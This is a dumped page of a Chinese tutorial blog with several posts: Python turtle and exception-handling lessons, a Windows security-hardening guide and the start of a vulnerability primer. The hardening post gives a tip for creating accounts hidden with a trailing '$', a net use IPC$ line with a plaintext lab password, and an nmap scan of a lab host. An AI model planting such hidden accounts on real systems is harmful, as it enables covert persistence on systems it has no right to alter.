-<p>（1）七段数码管由7段数码管拼接而成，每段有亮或不亮两种情况，改进型的七段数码管还包括一个小数点的位置。七段数码管能形成pow(2,7)=128种不同状态，其中部分状态能够显示易于人们理解的数字或字母含义，因此被广泛使用。</p>
-<p>（2）通过turtle库函数绘制七段数码管形式的日期信息。该问题的IPO描述如下：</p>
-<ul>
-<li>输入：当前日期的数字形式</li>
-<li>处理：根据每个数字绘制七段数码管表示</li>
-<li>输出：绘制当前日期的七段数码管表示</li>
-</ul>
-<p>（3）每个0到9的数字都有相同的七段数码管样式，因此可以通过设计函数复用数字的绘制过程。此外，每个七段数码管包括7个数码管样式，除了数码位置不同外，绘制风格一致，也可以通过函数复用单个数码端的绘制过程。程序的全部代码如下：</p>
-<pre><code class="python">import turtle, datetime
-def drawLine(draw):         #绘制单段数码管
-    turtle.pendown() if draw else turtle.penup()
-    turtle.fd(40)
-    turtle.right(90)        #画笔指针顺时针旋转90度
-def drawDigit(d):           #根据数字绘制七段数码管
-    drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)
-    drawLine(True) if d in [0,1,3,4,5,6,7,8,9] else drawLine(False)
-    drawLine(True) if d in [0,2,3,5,6,8,9] else drawLine(False)
-    drawLine(True) if d in [0,2,6,8] else drawLine(False)
-    turtle.left(90)         #画笔指针逆时针旋转90度
-    drawLine(True) if d in [0,4,5,6,8,9] else drawLine(False)
-    drawLine(True) if d in [0,2,3,5,6,7,8,9] else drawLine(False)
-    drawLine(True) if d in [0,1,2,3,4,7,8,9] else drawLine(False)
-    turtle.left(180)
-    turtle.penup()
-    turtle.fd(20)
-def drawDate(date):          #获得要输出的数字
-    for i in date:
-        drawDigit(eval(i))   #通过eval()函数将数字变为整数
-def main():
-    turtle.setup(800,350,200,200) #设置窗口大小
-    turtle.penup()
-    turtle.fd(-300)               #后退300
-    turtle.pensize(5)             #设置画笔宽度
-    drawDate(datetime.datetime.now().strftime(&#39;%Y%m%d&#39;))  #设置格式化后的系统时间
-    turtle.hideturtle()     #隐藏乌龟
-main()</code></pre>
-<p><img src="https://i.loli.net/2021/02/10/YcpEnA9ae7mkbdM.png" alt="image-20210210185913020"></p>
-<p>（4）实例代码中定义了drawDigit()函数，该函数根据输入的数字d绘制七段数码管。每个数码管的绘制顺序如下图所示。</p>
-<p><img src="https://i.loli.net/2021/02/10/3sCFkVX5Uv6dIEo.png" alt="image-20210210190032681"></p>
-<p>（5）绘制起点在数码管中部左侧，无论每段数码管是否会被绘制出来，turtle画笔都会按顺序画完7个数码管。对于给定的数字d，那个数码段会被绘制出来采用if-else语句判断。</p>
-<pre><code class="python">drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)</code></pre>
-<p>（6）上面一行代码根据输入数字判断是否要绘制七段数码管最中间的横线，当需要绘制时，调用绘制函数drawLine()，参数赋值True；当不需要绘制时，参数赋值False。根据0~9数字结构，对于2,3,4,5,6,8,9这些数字需要绘制，否则不需要绘制。</p>
-<p>（7）为了使输出样式固定，简化设计，当不需要绘制时，turtle画笔需要抬起。drawLine()函数根据输出参数的值(True或False)决定是否抬起画笔。</p>
-<p>（8）为了使代码模块化更好，实例中定义了drawDate()函数和main()函数。</p>
-<ul>
-<li>其中drawDate()函数将更长数字分解为单个数字，进一步调用drawDigit()分别绘制每个数字。</li>
-<li>main()函数将启动窗体大小、设置画笔宽度、设置系统时间等功能封装在一起，但main()函数并不体现单一功能，这种封装仅从提高代码可读性角度考虑。</li>
-</ul>
-<p>（9）2.0版本</p>
-<pre><code class="python">import turtle, datetime
-def drawGap():              #绘制数码管间隔
-    turtle.penup()
-    turtle.fd(5)
-def drawLine(draw):         #绘制单段数码管
-    drawGap()
-    turtle.pendown() if draw else turtle.penup()
-    turtle.fd(40)
-    drawGap()
-    turtle.right(90)
-def drawDigit(d):           #根据数字绘制七段数码管
-    drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)
-    drawLine(True) if d in [0,1,3,4,5,6,7,8,9] else drawLine(False)
-    drawLine(True) if d in [0,2,3,5,6,8,9] else drawLine(False)
-    drawLine(True) if d in [0,2,6,8] else drawLine(False)
-    turtle.left(90)
-    drawLine(True) if d in [0,4,5,6,8,9] else drawLine(False)
-    drawLine(True) if d in [0,2,3,5,6,7,8,9] else drawLine(False)
-    drawLine(True) if d in [0,1,2,3,4,7,8,9] else drawLine(False)
-    turtle.left(180)
-    turtle.penup()
-    turtle.fd(20)
-def drawDate(date):          #获得要输出的数字
-    turtle.pencolor(&quot;red&quot;)
-    for i in date:
-        if i == &#39;-&#39;:
-            turtle.write(&#39;年&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))
-            turtle.pencolor(&quot;green&quot;)
-            turtle.fd(40)
-        elif i == &#39;=&#39;:
-            turtle.write(&#39;月&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))
-            turtle.pencolor(&quot;blue&quot;)
-            turtle.fd(40)
-        elif i == &#39;+&#39;:
-            turtle.write(&#39;日&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))
-        else:
-            drawDigit(eval(i))
-def main():
-    turtle.setup(800,350,200,200)
-    turtle.penup()
-    turtle.fd(-350)
-    turtle.pensize(5)
-    drawDate(datetime.datetime.now().strftime(&#39;%Y%m%d&#39;))
-    turtle.hideturtle()
-main()</code></pre>
-<p><img src="https://i.loli.net/2021/02/10/WA3NPQFU1VbdJ5H.png" alt="image-20210210195715369"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/14/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A801/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/深入Python语言(四)-程序的控制结构02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/13/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8402/">深入Python语言(四)-程序的控制结构02</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/13/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8402/" class="archive-article-date">
-  	<time datetime="2020-12-13T07:59:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="random库的使用"><a href="#random库的使用" class="headerlink" title="random库的使用"></a>random库的使用</h2><p><strong>要点：随机运算的标准函数库random共提供9个常用函数</strong></p>
-<h3 id="random库描述"><a href="#random库描述" class="headerlink" title="random库描述"></a>random库描述</h3><p>Python内置的random库主要用于产生各种分布的伪随机数序列。random采用梅森旋转算法生成伪随机数序列。主要目的是生成随机数，所有函数都是基于最基本的random.random()函数扩展实现。</p>
-<h3 id="random库解析"><a href="#random库解析" class="headerlink" title="random库解析"></a>random库解析</h3><table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">seed(a=None)</td>
-<td align="center">初始化随机数种子，默认值为当前系统时间</td>
-</tr>
-<tr>
-<td align="center">random()</td>
-<td align="center">生成一个[0.0, 1.0]之间的随机小数</td>
-</tr>
-<tr>
-<td align="center">randint(a, b)</td>
-<td align="center">生成一个[a,  b]之间的整数</td>
-</tr>
-<tr>
-<td align="center">getrandbits(k)</td>
-<td align="center">生成一个k比特长度的随机整数</td>
-</tr>
-<tr>
-<td align="center">randrange(start, stop[, step])</td>
-<td align="center">生成一个[start, stop]之间以step为步数的随机整数</td>
-</tr>
-<tr>
-<td align="center">uniform(a, b)</td>
-<td align="center">生成一个[a, b]之间的随机小数</td>
-</tr>
-<tr>
-<td align="center">choice(seq)</td>
-<td align="center">从序列类型，例如列表中随机返回一个元素</td>
-</tr>
-<tr>
-<td align="center">shuffle(seq)</td>
-<td align="center">将序列类型中的元素随机排列，返回打乱后的序列</td>
-</tr>
-<tr>
-<td align="center">sample(pop, k)</td>
-<td align="center">从pop类型中随机选取k个元素，以列表类型返回</td>
-</tr>
-</tbody></table>
-<p>（1）random库的引用方法与math库一样，可以采用下面两种方式实现：</p>
-<p>import random 或 from random import *</p>
-<pre><code class="python">&gt;&gt;&gt; from random import *
-&gt;&gt;&gt; randrange(0, 100, 4)  #从0开始到100以4递增的元素中随机返回
-20
-&gt;&gt;&gt; choice(range(100))
-82
-&gt;&gt;&gt; list(range(10))
-[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
-&gt;&gt;&gt; ls = list(range(10))
-&gt;&gt;&gt; shuffle(ls)
-&gt;&gt;&gt; print(ls)
-[3, 5, 8, 7, 9, 0, 1, 2, 6, 4]</code></pre>
-<p>（2）生成随机数之前可以通过seed()函数指定随机数种子，随机数种子一般是一个整数，只要种子相同，每次生成的随机数序列也相同。</p>
-<pre><code class="Python">seed(125)  #随机数种子赋值为125
-&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))
-&#39;4.4.10&#39;
-&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))
-&#39;5.10.3&#39;
-&gt;&gt;&gt; seed(125)   #再次给随机数种子赋值125
-&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))
-&#39;4.4.10&#39;</code></pre>
-<p>（3）从上述语句可发现，在设定相同种子后，每次调用随机函数生成的随机数是相同的。这是随机数种子的作用。</p>
-<h2 id="程序的异常处理"><a href="#程序的异常处理" class="headerlink" title="程序的异常处理"></a>程序的异常处理</h2><p><strong>要点：Python通过try、except等保留字提供异常处理功能</strong></p>
-<pre><code class="python">num = eval(input(&quot;请输入一个数字：&quot;))
-print(num**2)</code></pre>
-<p>（1）输入数字时，程序正常执行，若输入数字则会报错。</p>
-<pre><code class="python">请输入一个数字：100
-10000
-&gt;&gt;&gt; 
-
-请输入一个数字：abc
-Traceback (most recent call last):
-  File &quot;&lt;pyshell#2&gt;&quot;, line 1, in &lt;module&gt;      #line1为异常发生的代码行数
-    num = eval(input(&quot;请输入一个数字：&quot;))
-  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
-NameError: name &#39;abc&#39; is not defined           #NameError为异常类型，后面跟异常内容提示
-&gt;&gt;&gt; </code></pre>
-<h3 id="异常处理：try-except语句"><a href="#异常处理：try-except语句" class="headerlink" title="异常处理：try-except语句"></a>异常处理：try-except语句</h3><p>（1）Python使用try-except语句实现异常处理，其基本语法格式如下：</p>
-<pre><code class="python">try:
-    &lt;语句块1&gt;
-except &lt;异常类型&gt;:
-    &lt;语句块2&gt;</code></pre>
-<p>语句块1是正常执行的内容，当发生异常时执行except保留字后面的语句块。例如：</p>
-<pre><code class="python">try:
-    num = eval(input(&quot;请输入一个数字：&quot;))
-    print(num**2)
-except NameError:
-    print(&quot;输入错误，请输入一个整数。&quot;)</code></pre>
-<p>执行结果：</p>
-<pre><code class="python">请输入一个数字：abc
-输入错误，请输入一个整数。
-&gt;&gt;&gt; </code></pre>
-<h3 id="异常的高级用法"><a href="#异常的高级用法" class="headerlink" title="异常的高级用法"></a>异常的高级用法</h3><p>（1)try-except语句可以支持多个except语句，语法格式如下：</p>
-<pre><code class="python">try:
-    &lt;语句块1&gt;
-except &lt;异常类型1&gt;:
-    &lt;语句块2&gt;
-...
-except &lt;异常类型N&gt;:
-    &lt;语句块N+1&gt;
-except:
-    &lt;语句块N+2&gt;</code></pre>
-<p>（2）其中，第1到第N个except语句后面都指定了异常类型，说明这些except所包含的语句块只处理这些类型的异常。最后一个except语句没有指定任何类型，表示它对应的语句块可以处理所有其他异常。这个过程与if-elif-else语句类似，是分支结构的一种表达方式。例如：</p>
-<pre><code class="python">try:
-    alp = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
-    idx = eval(input(&quot;请输入一个整数：&quot;))
-    print(alp[idx])
-except NameError:
-    print(&quot;输入错误，请输入一个整数!&quot;)
-except:
-    print(&quot;其他错误&quot;)</code></pre>
-<p>（3）上面的程序中，当用户输入非整数字符时，except NameError 异常被捕获到，提示用户输入类型错误，当用户输入数字不再0到25之间时，异常被except捕获，程序打印其错误。执行结果如下：</p>
-<pre><code class="python">&gt;&gt;&gt;
-请输入一个整数：abc
-输入错误，请输入一个整数!
-&gt;&gt;&gt;
-请输入一个整数：100
-其他错误</code></pre>
-<p>（4）除了try和except保留字外，异常语句还可以和else和finally保留字配合使用，语法格式如下：</p>
-<pre><code class="python">try:
-    &lt;语句块1&gt;
-except &lt;异常类型1&gt;:
-    &lt;语句块2&gt;
-else:
-    &lt;语句块3&gt;
-finally:
-    &lt;语句块4&gt;</code></pre>
-<p>（5）else语句与循环中的else一样，当try中的语句块1正常执行结束且没有发生异常时，else中的语句块3执行，可以看作是对try语句块正常执行后的一种追加处理。若except捕获到异常，则不会执行else中的语句块3。</p>
-<p>finally语句块则不同，无论try中的语句块1是否发生异常，语句块4都会执行。因此，可以将程序执行语句块1的一些收尾工作放在这里，例如：关闭、打开文件等。</p>
-<pre><code class="python">try:
-    alp = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
-    idx = eval(input(&quot;请输入一个整数：&quot;))
-    print(alp[idx])
-except NameError:
-    print(&quot;输入错误，请输入一个整数!&quot;)
-except:
-    print(&quot;其他错误&quot;)
-else:
-    print(&quot;没有发生异常&quot;)
-finally:
-    print(&quot;程序执行完毕，不知道是否发生了异常&quot;)</code></pre>
-<p>执行结果：</p>
-<pre><code class="python">&gt;&gt;&gt;
-请输入一个整数：6
-G
-没有发生异常
-程序执行完毕，不知道是否发生了异常
-&gt;&gt;&gt; 
-请输入一个整数：abc
-输入错误，请输入一个整数!
-程序执行完毕，不知道是否发生了异常</code></pre>
-<p>（6）try-except异常一般只用来检测极少发生的情况，编写程序时不应过度依赖try-except这种异常处理机制，应该尽量在程序中采用if语句直接判断，避免通过异常处理来应对可能发生的情况。因为采用try-except语句会影响代码的可读性，增加代码维护难度。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/13/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8402/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安全初级/Windows系统安全加固" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/10/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">Windows系统安全加固</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/10/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/" class="archive-article-date">
-  	<time datetime="2020-12-10T08:30:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="安全加固基本思路"><a href="#安全加固基本思路" class="headerlink" title="安全加固基本思路"></a>安全加固基本思路</h2><h3 id="安全基线"><a href="#安全基线" class="headerlink" title="安全基线"></a>安全基线</h3><p>（1）安全基线，即系统必须达到的最低的安全标准</p>
-<p>（2）一般通过检查各安全配置参数是否符合标准来度量</p>
-<h3 id="系统信息审查"><a href="#系统信息审查" class="headerlink" title="系统信息审查"></a>系统信息审查</h3><p>（1）查看系统的详细版本号，使用命令：</p>
-<pre><code>ver 或者 winver</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/FMeLBRwpbI5d6WK.png" alt="image-20201210163842045"></p>
-<p><img src="https://i.loli.net/2020/12/10/dnkx2zrlBDy5Obp.png" alt="image-20201210164309222"></p>
-<p>（2）查看系统的服务补丁包(Service Pack)，1个SP版本包含了该系统一段时间系统补丁和服务更新的集合。</p>
-<pre><code>wmic os get ServicePackMajorVersion</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/RMjFdkwe2aWpHsL.png" alt="image-20201210164333299"></p>
-<p>（3）查看系统的补丁安装情况</p>
-<pre><code>wmic qfe get hotfixid,InstalledOn</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/uaWThg9wYXoiRlc.png" alt="image-20201210164603798"></p>
-<p>（4）查看主机名</p>
-<pre><code>hostname</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/XAxzg9RNInQ86pi.png" alt="image-20201210164905930"></p>
-<p>（5）查看系统信息，包括主机信息，注册ID，处理器，内存，BIOS，域，补丁，网卡等信息。</p>
-<pre><code>systeminfo</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/5gmDzh12qQBv8tI.png" alt="image-20201210165140544"></p>
-<p>（6）查看开放端口</p>
-<pre><code>netstat -ano
-netstat -ano | find &quot;445&quot;     //端口筛选</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/ocea9lZtJTN5hIE.png" alt="image-20201210165941323"></p>
-<p><img src="https://i.loli.net/2020/12/10/F4EUNLO9hQyi7fj.png" alt="image-20201210170028656"></p>
-<p>（7）查看路由表，查看网络配置</p>
-<pre><code>route print
-ipconfig/all</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/HKiMeIPbUjcOXA2.png" alt="image-20201210170259177"></p>
-<p><img src="https://i.loli.net/2020/12/10/ix2Xm8wFtZouLjv.png" alt="image-20201210170356121"></p>
-<h2 id="Windows系统安全漏洞的修复"><a href="#Windows系统安全漏洞的修复" class="headerlink" title="Windows系统安全漏洞的修复"></a>Windows系统安全漏洞的修复</h2><h3 id="漏洞修复——方法1-补丁安装"><a href="#漏洞修复——方法1-补丁安装" class="headerlink" title="漏洞修复——方法1.补丁安装"></a>漏洞修复——方法1.补丁安装</h3><p>（1)补丁安装属于永久解决方案</p>
-<p>（2）微软官方补丁管理，官网补丁下载地址:<a target="_blank" rel="noopener" href="http://www.catalog.update.microsoft.com/home.aspx">http://www.catalog.update.microsoft.com/home.aspx</a></p>
-<p><img src="https://i.loli.net/2020/12/10/Wd5ceJPw6niLkza.png" alt="image-20201210171059715"></p>
-<p><img src="https://i.loli.net/2020/12/10/IoaNf5WcJEZ4Gyd.png" alt="image-20201210171120240"></p>
-<h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h4><p><strong>以Windows7 SP1安装ms12-020漏洞补丁KB2621440为例</strong></p>
-<p>（1）微软安全公告</p>
-<p>（2）下载并安装补丁</p>
-<p>（3）查看补丁安装情况</p>
-<pre><code>wmic qfe get hotfixid,InstalledOn | find /i &quot;KB2621440&quot;</code></pre>
-<p>（4）Metasploit验证无漏洞</p>
-<h3 id="漏洞修复——方法2-端口封禁"><a href="#漏洞修复——方法2-端口封禁" class="headerlink" title="漏洞修复——方法2.端口封禁"></a>漏洞修复——方法2.端口封禁</h3><p>（1）端口封禁是漏洞修复的临时解决方法</p>
-<p>（2）端口能被利用，是因为漏洞所在服务依赖端口开放访问，如果将端口封禁，那么漏洞便无法成功利用。封禁并不是把端口关掉，而是把访问该端口的流量过滤。例：</p>
-<p>ms17-010漏洞所在服务是文件共享服务smb，依赖端口为135,139,445</p>
-<p>ms12-020漏洞所在服务是远程桌面服务RDP，依赖端口为3389</p>
-<p>ms15-034漏洞所在服务是超文本传输协议http，依赖端口为80</p>
-<p>（3）端口封禁的方法：在组策略中创建IP安全策略。</p>
-<h4 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h4><p><strong>封禁135端口对外开放</strong></p>
-<p>（1）运行gpedit.msc进入组策略配置(组策略:是针对用户upn或计算机上强制使用的配置方法，不是权限)</p>
-<pre><code>PS:家庭版的Windows没有组策略，以管理员身份运行下载的脚本后，再用运行窗口即可打开gpedit.msc</code></pre>
-<p>（2）依次点击进入计算机配置–&gt;Windows设置–&gt;安全设置–&gt;IP安全策略</p>
-<p>（3）在空白处右键，创建IP安全策略</p>
-<p>（4）进入IP安全策略设置向导</p>
-<p>（5）设置IP安全策略名称</p>
-<p>（6）去除”激活默认响应规则”</p>
-<p>（7）点击完成， 并进入编辑属性</p>
-<p>（8）去除”使用添加向导”复选框，点击”添加”进入IP筛选列表配置</p>
-<p>（9）去除”使用添加向导”复选框，点击”添加”进入IP筛选器配置</p>
-<p>（10）地址选项卡，源地址选择”任何地址”，目标地址选择”我的IP地址”，去掉”镜像”</p>
-<p>（11）协议选项卡，协议类型选择”TCP”,设置从任意端口，到此端口填写135，点击”确定”，若需要添加屏蔽端口，可再次点击添加，无需添加则点击”确定”</p>
-<p>（12）在筛选器操作选项卡，点击”添加”，添加一个新筛选器操作”阻止”</p>
-<p>（13）选中新建的IP筛选列表和筛选器操作，点击”应用”</p>
-<p>（14）右键新IP安全策略，点击”分配”，指派新建的IP安全策略</p>
-<pre><code>运行--&gt;gpupdate /force    ##强制更新</code></pre>
-<p>（15）在kali中使用nmap工具验证端口已被阻塞</p>
-<pre><code>nmap -sS -p 135,139,445,3389 192.168.14.131</code></pre>
-<h2 id="Windows系统配置加固"><a href="#Windows系统配置加固" class="headerlink" title="Windows系统配置加固"></a>Windows系统配置加固</h2><h4 id="账号口令"><a href="#账号口令" class="headerlink" title="账号口令"></a>账号口令</h4><p><strong>账号优化:目的是为了梳理系统中的账号以及口令，避免默认账号及弱口令的存在</strong></p>
-<p>（1）查看账号方式：</p>
-<pre><code>开始--&gt;运行--&gt;compmgmt.msc(进入计算机管理)/lusrmgr.msc--&gt;本地用户和组
-或者
-开始--&gt;运行--&gt;cmd--&gt;net user</code></pre>
-<p><img src="https://i.loli.net/2020/12/10/KSJmdz6aosPxeNM.png" alt="image-20201210185315326"></p>
-<p>（2）删除无用账号</p>
-<pre><code>net user user_name /del
-PS:net user user_name$ passwd /add  增加一个账号，其中的添加美元符号即可在命令行中隐藏
-net user /?  获取提示</code></pre>
-<p>（3）锁定无用账号，如锁定”Guest”账号</p>
-<pre><code>net user Guest /active:no</code></pre>
-<p>（4）禁用Guest账号：运行–&gt;lusrmgr.msc–&gt;用户–&gt;Guest–&gt;禁用</p>
-<p><strong>口令策略：增强密码复杂度，防止用户长期使用同一个账号，以及账号锁定策略等，降低系统账号被暴力破解的可能性</strong></p>
-<p>（1）配置方式：开始–&gt;运行–&gt;secpol.msc(本地安全策略)–&gt;安全设置</p>
-<p>（2）账户策略–&gt;密码策略(建议加固值)</p>
-<p>（3）账户策略–&gt;账户锁定策略(建议加固值)</p>
-<p>（4）本地策略–&gt;安全选项：配置用户退出后再次登录不会显示上次退出的用户名</p>
-<h4 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h4><p>（1）授权账号登录：目的是设置允许从本地或者远程登录的账号。</p>
-<p>（2）配置操作：开始–&gt;运行–&gt;secpol.msc–&gt;安全设置–&gt;本地策略–&gt;用户权限分配</p>
-<p>（3）要求系统账号无法远程登录：用户权限分配–&gt;拒绝通过远程桌面服务登录–&gt;添加用户和组，添加system和administrator。</p>
-<p><img src="https://i.loli.net/2020/12/13/ipIALnbZvF1JOxB.png" alt="image-20201213111329893"></p>
-<p><img src="https://i.loli.net/2020/12/13/SekzPwMoQpaC9AF.png" alt="image-20201213111112396"></p>
-<p><img src="https://i.loli.net/2020/12/13/P459tnRrvLBY1FV.png" alt="image-20201213110908484"></p>
-<p>拒绝从网络访问这台计算机–&gt;添加用户和组，添加system和administrator</p>
-<p><img src="https://i.loli.net/2020/12/13/TEGv8lBVZSO1aoI.png" alt="image-20201213110947814"></p>
-<p>（4）最后要强制生效组策略，运行窗口下执行</p>
-<pre><code>gpupdate /force</code></pre>
-<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>利用cmd将Windows物理机的文件传输到Windows虚拟机。</p>
-<pre><code>net use \\192.168.14.131\ipc$ &quot;ndsec&quot; user:ndsec       
-##其中ndsec为虚拟机的账户密码，192.168.14.131为虚拟机的IP地址</code></pre>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全初级</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/10/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安全初级/系统漏洞分析与验证" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/">系统漏洞分析与验证</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/" class="archive-article-date">
-  	<time datetime="2020-12-06T01:51:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="安全漏洞的基本概念"><a href="#安全漏洞的基本概念" class="headerlink" title="安全漏洞的基本概念"></a>安全漏洞的基本概念</h2><h3 id="漏洞的定义"><a href="#漏洞的定义" class="headerlink" title="漏洞的定义"></a>漏洞的定义</h3><p>（1）漏洞(Vulnerability)是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。简单说就是指一个系统存在的弱点或缺陷。</p>
-<p>（2）1970-80年代，早期黑客的出现和第一个计算机病毒的产生，软件漏洞逐渐引起人们的注意。</p>
-<p>（3）计算机病毒(Computer Virus)是编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。</p>
-<h3 id="漏洞的成因"><a href="#漏洞的成因" class="headerlink" title="漏洞的成因"></a>漏洞的成因</h3><p>（1）实现漏洞：是安全漏洞中最大的一类。实现漏洞是由于在程序编码时不够严谨或对于安全性的考虑不周而产生的漏洞，缓冲区溢出类漏洞就是最典型的实现漏洞。</p>
